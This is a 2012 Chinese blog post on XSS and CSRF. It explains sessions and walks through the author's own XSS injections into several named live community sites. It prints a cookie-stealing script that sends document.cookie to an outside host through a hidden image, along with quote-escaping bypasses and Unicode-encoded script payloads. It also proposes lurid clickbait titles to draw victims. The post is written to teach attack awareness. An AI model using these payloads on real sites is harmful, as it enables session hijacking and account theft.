# PHP相关系列 - XSS相关 - 自娱自乐的代码人，专注Java、c、php - CSDN博客





2012年09月12日 14:37:32[initphp](https://me.csdn.net/initphp)阅读数：1384








### 关于XSS（跨站脚本攻击）和CSRF（跨站请求伪造）

我们常说的网络安全其实应该包括以下三方面的安全：

1、机密性，比如用户的隐私被窃取，帐号被盗，常见的方式是木马。

2、完整性，比如数据的完整，举个例子，康熙传位十四子，被当时四阿哥篡改遗诏：传位于四子，当然这是传说，常见的方式是XSS跨站脚本攻击和csrf跨站请求伪造。

3、可用性，比如我们的网络服务是否可用，常用的攻击方式是dos和ddos，拒绝服务和分布式拒绝服务攻击。

本文主要讲述xss和csrf的攻击，配合实例讲述这2者攻击的危害性以及一些防范的措施，有讲的不对或者不完整的地方欢迎大大们补充说明。

**注：本站攻击的例子都是原生的实例，并没有借鉴网上的例子，另外请各位大侠高抬贵手不要随便乱试哦~，本文旨在指出攻击的手段和防范的方法。**

XSS是什么？它的全名是：Cross-site scripting，为了和CSS层叠样式表区分所以取名XSS。是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。

而CSRF是什么呢？CSRF全名是Cross-site request forgery，是一种对网站的恶意利用，CSRF比XSS更具危险性。想要深入理解CSRF的攻击特性我们有必要了解一下网站session的工作原理。

session我想大家都不陌生，无论你用.net或PHP开发过网站的都肯定用过session对象，然而session它是如何工作的呢？如果你不清楚请往下看。

先问个小问题：如果我把浏览器的cookie禁用了，大家认为session还能正常工作吗？

答案是否定的，我在这边举个简单的例子帮助大家理解session。

比如我买了一张高尔夫俱乐部的会员卡，俱乐部给了我一张带有卡号的会员卡。我能享受哪些权利（比如我是高级会员卡可以打19洞和后付费喝饮料，而初级会员卡只能在练习场挥杆）以及我的个人资料都是保存在高尔夫俱乐部的数据库里的。我每次去高尔夫俱乐部只需要出示这张高级会员卡，俱乐部就知道我是谁了，并且为我服务了。

这里我们的高级会员卡卡号 = 保存在cookie的sessionid；

而我的高级会员卡权利和个人信息就是服务端的session对象了。

我们知道http请求是无状态的，也就是说每次http请求都是独立的无关之前的操作的，但是每次http请求都会将本域下的所有cookie作为http请求头的一部分发送给服务端，所以服务端就根据请求中的cookie存放的sessionid去session对象中找到该会员资料了。

当然session的保存方法多种多样，可以保存在文件中，也可以内存里，考虑到分布式的横向扩展我们还是建议把它保存在第三方媒介中，比如redis或者mongodb。

我们理解了session的工作机制后，CSRF也就很容易理解了。CSRF攻击就相当于恶意用户A复制了我的高级会员卡，哪天恶意用户A也可以拿着这张假冒的高级会员卡去高尔夫俱乐部打19洞，享受美味的饮料了，而我在月底就会收到高尔夫俱乐部的账单！

了解CSRF的机制之后，危害性我相信大家已经不言而喻了，我可以伪造某一个用户的身份给其好友发送垃圾信息，这些垃圾信息的超链接可能带有木马程序或者一些诈骗信息（比如借钱之类的），如果CSRF发送的垃圾信息还带有蠕虫链接的话，那些接收到这些有害信息的好友万一打开私信中的连接就也成为了有害信息的散播着，这样数以万计的用户被窃取了资料种植了木马。整个网站的应用就可能在瞬间奔溃，用户投诉，用户流失，公司声誉一落千丈甚至面临倒闭。曾经在MSN上，一个美国的19岁的小伙子Samy利用css的background漏洞几小时内让100多万用户成功的感染了他的蠕虫，虽然这个蠕虫并没有破坏整个应用，只是在每一个用户的签名后面都增加了一句“Samy
 是我的偶像”，但是一旦这些漏洞被恶意用户利用，后果将不堪设想，同样的事情也曾经发生在新浪微博上面。

想要CSRF获取用户的信息，就必须XSS注入成功，下面的例子我只是简单的注入alert('xss')，至于恶意用户完全可以把alert('xss')换成他想要的任意的js代码，用来发送post或者get请求修改用户的资料，获取用户好友信息，伪造发送私信，甚至做成蠕虫散播到整个web应用，所以千万不要小看了XSS注入攻击带来的后果，并不是alert一个对话框那么简单！

下面我们就卷起袖子开始我们的XSS之旅：

1、实例：XSS注入名城苏州论坛

我是苏州人，我就先拿本地的官方论坛www.2500sz.com开刀吧。

我打开2500sz.com的论坛然后注册了一个帐号，发布一个新话题，输入以下代码：
[![enter image description here](http://cnodejs.org/upload/4efc278525fa69ac690000f7/1346778103472_1.jpg)](http://cnodejs.org/upload/4efc278525fa69ac690000f7/1346778103472_1.jpg)

上面的代码就是输入一个网络分享的图片，我在src中直接写入了javascript:alert('xss')；操作成功后生成帖子，用IE6、7的用户打开这个我发的这个帖子就会出现下图的alert('xss')弹窗。
[![enter image description here](http://cnodejs.org/upload/4efc278525fa69ac690000f7/1346778143370_1.jpg)](http://cnodejs.org/upload/4efc278525fa69ac690000f7/1346778143370_1.jpg)

当然我会将标题设计的非常吸引人点击，比如 “陈冠希艳照又有流出2012版(20P无码)” ，这样如果我将里面的alert换成恶意代码，比如：

location.href='[http://www.xss.com?cookie='+document.cookie；用户的cookie我也拿到了，如果服务端session没有设置过期的话，我以后甚至拿这个cookie而不需用户名密码，就可以以这个用户的身份登录成功了。](http://www.xss.com?cookie=)

这里的location.href只是处于简单这样做，如果做了跳转这个帖子很快会被管理员删除，但是如果我写如下代码，并且帖子的内容也是比较真实的，说不定这个帖子就会祸害很多人：

```
var img = document.createElement('img');
img.src='[http://www.xss.com?cookie='+document.cookie](http://www.xss.com?cookie=);
img.style.display='none';
document.getElementsByTagName('body')[0].appendChild(img);
```

这样就神不知鬼不觉的把当前用户的cookie发送给了我的恶意站点，我的恶意站点通过获取get参数就拿到了用户的cookie。当然我们可以通过这个方法拿到用户各种各样的数据。

2、还是苏州本地sns，苏州人社区

我们访问www.szr.com社区，这是一个面向于苏州人的sns社区，主要界面是抄袭的新浪微博。

注入尝试1：
[![enter image description here](http://cnodejs.org/upload/4efc278525fa69ac690000f7/1346778168051_1.jpg)](http://cnodejs.org/upload/4efc278525fa69ac690000f7/1346778168051_1.jpg)

直接输入<script>标签，发现php将单引号和双引号都转义了，而且也将<>这类符号过滤掉了，尝试失败，继续寻找突破口。

注入尝试2：

图片注入，有些sns社区可以让用户自己上传图片，然后填写ref属性或者title属性，这些属性往往会成为注入点，如果应用程序文件名没有修改的话也可能被注入。更有胜者，在新版本的discuz中，用户可以分享照片还可以查看照片的exif信息，比如光圈相机型号等等，有达人用软件修改了exif信息，在里面嵌入恶意js代码，然后吸引用户查看exif信息。

但是这个szr社区并不提供图片title设置，而且上传的图片都经过服务端的改名了。尝试再次失败，不气馁继续寻找突破口。

注入尝试3：

我们发现了视频这个按钮，这个功能可以通过视频的连接地址分享视频，比如我可以发优酷上的视频地址来分享给其他用户。于是我打开视频功能，在输入框中写入：
`[http://www.baidu.com/“onclick=alert('xss](http://www.baidu.com/%E2%80%9Conclick=alert%28)') title="xss"`
生成了如下图的情况：
[![enter image description here](http://cnodejs.org/upload/4efc278525fa69ac690000f7/1346778198909_1.jpg)](http://cnodejs.org/upload/4efc278525fa69ac690000f7/1346778198909_1.jpg)

虽然注入还是失败了，php将单引号转义了，但是我们发现szr社区并没有对我输入的url进行有效性验证，而且没有过滤双引号，所以导致了整个html的dom元素测漏了。测漏是一个术语，表示XSS攻击提前闭合了html标签。我们找到了突破口，下面就是如何处理掉讨人厌的转义反斜杠了。

注入尝试4：

既然单引号和双引号都被转义干掉了，我们就不能利用他们了，换一个思路我们可以绕过单引号和双引号输出字符串吗？答案是肯定的，我再添加视频路径，输入以下代码：
`[http://www.baidu.com/](http://www.baidu.com/)"onclick=alert(this.name) name=xss ref=xss`
构建成功后如图：
[![enter image description here](http://cnodejs.org/upload/4efc278525fa69ac690000f7/1346778233272_1.jpg)](http://cnodejs.org/upload/4efc278525fa69ac690000f7/1346778233272_1.jpg)

我们成功注入了onclick事件和name属性，接下来发生的事情就和我们想象中一样了
[![enter image description here](http://cnodejs.org/upload/4efc278525fa69ac690000f7/1346778258074_1.jpg)](http://cnodejs.org/upload/4efc278525fa69ac690000f7/1346778258074_1.jpg)

当用户点击了我们的视频按钮，弹出了对话框xss，我们注入成功了，喝杯椰奶庆祝下把！

可能有些朋友会说那是因为php端没有验证视频的有效性，比如这段url放在浏览器中是无法打开的，只需要在后端简单请求一下这个地址就可以过滤掉这类攻击了，答案当然也是否定的，我们看如下代码：
`[http://www.baidu.com/#](http://www.baidu.com/#)"onclick=alert(this.name) name=xss ref=xss`
你可以把这段url贴入到浏览器中，发现还是可以打开百度页面的。所以仅仅验证url的有效性是远远不够的。

3、人人围sns

www.renrenwei.com是我之前单位的团队做的一个sns项目，我离职之后他们还在开发新版本，目前线上的版本XSS注入点之多令人结舌。几乎毫不设防，我们来简单看一下注入的流程：

人人围sns允许用户通过百度的edit发布文字分享，坑爹的是他竟然还允许直接编辑html标签

尝试1：

直接在edit中写入<script>标签，结果被过滤掉了，如此赤裸裸的注入还不被干掉简直太对不起老板了。

尝试2：

我们插入一张图片，打开html源码查看，直接在里面写上onload="alert('xss')"，见图：
[![enter image description here](http://cnodejs.org/upload/4efc278525fa69ac690000f7/1346778295514_1.jpg)](http://cnodejs.org/upload/4efc278525fa69ac690000f7/1346778295514_1.jpg)

上图我们插入了恶意代码，当图片onload事件结束就执行js脚本了
[![enter image description here](http://cnodejs.org/upload/4efc278525fa69ac690000f7/1346778313654_1.jpg)](http://cnodejs.org/upload/4efc278525fa69ac690000f7/1346778313654_1.jpg)

百度的edit果然坑爹了！弹出了xss，我们注入成功了，网站还有很多注入点，比如发视频等等不一一列举了。

4、ajax的json注入

一时也找不到例子，我就简单介绍一下这类注入的原理吧。现代网站为了加快加载和更好的用户体验，都大量使用了ajax，通信协议大部分是json字符串格式的，而页面为了多语言也使用了utf-8编码。

比如有这样的一个场景，是一篇博文的详细页，很多用户给这篇博文留言，为了加快页面加载速度，程序设计师要求先显示博文的内容，然后通过ajax去获取留言的第一页内容，通过ajax分页点击下一页获取第二页的留言。

这么做的好处有：

A.加快了博文详细页的加载，因为留言信息往往有用户头像，昵称，id等等，需要多表查询而且一般用户会先看博文，再拉下去看留言，这时留言已经加载完毕了。

B.AJAX的留言分页能够更加快速的响应，用户不必让博文重新刷新一边，而是直接查看更多的留言。

看上去一切都很美好的，用户进入详细页，先慢慢看博文，此时ajax辛勤的工作去拿留言的内容，然后显示在页面底部，但是当制作这个页面的前端工程师用如下代码后事情就不那么美好了。大家能看出什么端倪来吗？

```
var commentObj = $('#comment'); 
$.get('/getcomment', {r:Math.random(),page:1,article_id:1234},function(data){  
    if(data.state !== 200)  return commentObj.html('留言加载失败。')  
    commentObj.html(data.content);
},'json');
```

我们的设计初衷是，后端将留言内容套入模板，存入json格式如下：

{state:200, content:“模板的字符串片段”}

然后输出这段模板中的代码。

如果没有看出问题，我们继续。我们尝试执行下面的代码：
`$('div:first').html('&lt;script&gt;alert("xss")&lt;/script&gt;');`
ok正常弹出了alert框xss，你可能觉得这比较小儿科，我们强大的php程序员经过上面3种情况的历练已经完全过滤掉和转义了尖括号<>还有单双引号了"'，所以上面的那串恶意代码会漂亮的变成如下字符打印到留言内容中。
`&lt;script&gt; alert("xss")&lt;/script&gt; `
先表扬一下我们的php程序员，做的很好可以将常规的一些xss注入都屏蔽掉了，但是在utf-8中，字符还有一种表示方式，那就是unicode码，我们把上面的恶意字符串改写成如下：
`$('div:first').html('\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e');`
HOHO，大家可以去有jquery的网站上打开firbug运行一下，发现还是输出了alert的xss，可见我们的注入又成功了，只是这次累一点，需要将写好的恶意代码放入转码器中做下转义。

当年的webqq曾经就报过上面这种 Unicode 的XSS注入漏洞！

最后做下unicode和utf-8的扫盲，他们之间的区别和联系。

因为ASCII（128位不够用，有些国家256都不够用），所以出现了Unicode (解决ASCII编码不够用的情况)，当然 Unicode 和我们的GB2312是完全毫无关系的，Unicode只是一个符号集，它只规定了符号的二进制代码，而utf-8是Unicode的实现方式之一，我们看UTF-8的英文全称就知道了：Unicode Transformation Format。

UTF-8最大的一个特点，就是它是一种变长的编码方式。它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度，而Unicode 如果转变为16进制的话则是固定的长度的，这对某些英文字体来说是存储空间的浪费，我们看如下对应表就知道了：

```
Unicode符号范围 | UTF-8编码方式 
 (十六进制) | （二进制）  
 0000 0000-0000 007F | 0xxxxxxx 
 0000 0080-0000 07FF | 110xxxxx 10xxxxxx  
 0000 0800-0000 FFFF | 1110xxxx 10xxxxxx 10xxxxxx 
 0001 0000-0010 FFFF | 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx
```

Javascript利用\u表示unicode编码

尾声：XSS和CSRF一直存在于我们的身边，大家可以网上搜一下，大片片的漏洞介绍，包括新浪微博，webqq等大型公司的互联网应用也曾经或者还存在这类漏洞。

想要彻底抵御此类攻击确实比较困难，相信看了本文聪明的你心中肯定会有对策了。




